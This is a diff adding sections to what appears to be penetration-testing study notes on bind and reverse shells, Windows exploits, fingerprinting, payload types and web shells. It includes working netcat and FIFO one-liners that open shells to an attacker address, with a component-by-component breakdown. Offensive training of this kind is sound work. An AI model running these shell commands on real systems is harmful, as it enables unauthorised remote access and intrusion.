@@ -193,13 +193,125 @@ powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);
 nc -nlvp 1234 -e /bin/sh
 ```
 
-* This is executed on the target box and waits for an incoming connection
+* This is executed on the target box and waits for an incoming connection (only works with some versions of nc that support `-e`)
 
 ```
 nc [target box ip] 1234
 ```
 
 * This is executed on your attack box to connect to the listener on the target
+
+### **Named Pipe Bind Shell**
+
+When `-e` is not available, use a FIFO named pipe:
+
+**Server (target):**
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+```
+
+**Client (attack box):**
+
+```bash
+nc -nv 10.129.41.200 7777
+```
+
+---
+
+## One-Liner Breakdowns
+
+### Netcat/Bash Reverse Shell One-Liner
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
+```
+
+| Component | Purpose |
+|---|---|
+| `rm -f /tmp/f;` | Remove `/tmp/f` if it exists. `-f` ignores nonexistent files. |
+| `mkfifo /tmp/f;` | Create a FIFO named pipe file at `/tmp/f`. |
+| `cat /tmp/f \|` | Read the named pipe and pipe its output to the next command. |
+| `/bin/bash -i 2>&1 \|` | Start an interactive bash shell (`-i`), redirect stderr to stdout (`2>&1`), pipe output onward. |
+| `nc 10.10.14.12 7777 > /tmp/f` | Connect to the attacker on port 7777 and redirect received data back into the named pipe, completing the loop. |
+
+---
+
+## Infiltrating Windows
+
+### Prominent Windows Exploits
+
+| Vulnerability | Description |
+|---|---|
+| `MS08-067` | Critical SMB flaw exploited by the Conficker worm and Stuxnet. Affects many Windows revisions. |
+| `EternalBlue` (MS17-010) | NSA exploit leaked by Shadow Brokers. Used in WannaCry and NotPetya. SMBv1 code execution. Infected 200,000+ hosts in 2017. |
+| `PrintNightmare` | RCE in Windows Print Spooler. With valid creds or a low-priv shell, install a printer driver that grants SYSTEM access. |
+| `BlueKeep` (CVE-2019-0708) | RCE in Microsoft's RDP protocol via a miscalled channel. Affects Windows 2000 through Server 2008 R2. |
+| `Sigred` (CVE-2020-1350) | Flaw in DNS SIG resource record parsing. Exploiting the domain's DNS server (often the primary DC) yields Domain Admin. |
+| `SeriousSam` (CVE-2021-36934) | Permissions issue on `C:\Windows\system32\config`. Non-elevated users can read SAM database from volume shadow copy backups, dumping credentials. |
+| `Zerologon` (CVE-2020-1472) | Cryptographic flaw in MS-NRPC. ~256 guesses at a computer account password grants domain-level access in seconds. |
+
+### Windows Fingerprinting
+
+**TTL-based identification:**
+
+```bash
+ping 192.168.86.39
+# TTL=128 → Windows host (Linux defaults to 64)
+```
+
+**Nmap OS detection:**
+
+```bash
+sudo nmap -v -O 192.168.86.39
+```
+
+Look for `OS CPE: cpe:/o:microsoft:windows_10` and `OS details:` in the output. If detection fails, try `-A -Pn`. Firewalls can obscure results — use multiple checks to confirm.
+
+**Banner grab:**
+
+```bash
+sudo nmap -v 192.168.86.39 --script banner.nse
+```
+
+### Windows Payload File Types
+
+| Type | Extension | Use Case |
+|---|---|---|
+| DLL | `.dll` | Inject malicious DLL or hijack vulnerable library for priv esc / UAC bypass |
+| Batch | `.bat` | Automate commands via the command-line interpreter (open ports, connect back, enumerate) |
+| VBS | `.vbs` | Client-side scripting for phishing (macro-enabled docs, clicking cells to trigger Windows scripting engine) |
+| MSI | `.msi` | Craft payload as Windows installer package, execute with `msiexec` for elevated reverse shell |
+| PowerShell | `.ps1` | Dynamic .NET-based scripting — most versatile for shell access and post-exploitation |
+
+### Payload Generation Resources
+
+| Resource | Description |
+|---|---|
+| [MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework) | Swiss-army knife for enumeration, payload generation, exploitation, and post-exploitation |
+| [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings) | Cheat sheets for payload generation and general methodology |
+| [Mythic C2 Framework](https://github.com/its-a-feature/Mythic) | Alternative C2 framework with unique payload generation |
+| [Nishang](https://github.com/samratashok/nishang) | Offensive PowerShell framework — implants, shells, and utilities |
+| [Darkarmour](https://github.com/bats3c/darkarmour) | Obfuscated binary generation for Windows targets |
+
+### Payload Transfer Methods
+
+* **Impacket** — `psexec`, `smbclient`, `wmi`, Kerberos, and SMB server
+* **SMB** — Leverage domain shares, `C$`, `ADMIN$` for payload hosting, transfer, and data exfiltration
+* **Remote MSF Execution** — Many exploit modules build, stage, and execute payloads automatically
+* **Other Protocols** — FTP, TFTP, HTTP/S for file upload to the host
+
+---
+
+## Web Shell Considerations
+
+* Web apps may auto-delete uploaded files after a set period
+* Limited interactivity — no proper file system navigation, chaining commands may fail
+* Greater chance of leaving artifacts for defenders
+* Best practice: establish a reverse shell from the web shell, then delete the uploaded payload
+* Document all payload names, file hashes (SHA1/MD5), and upload locations for your report
+
+---
 
 ### Groovy
 
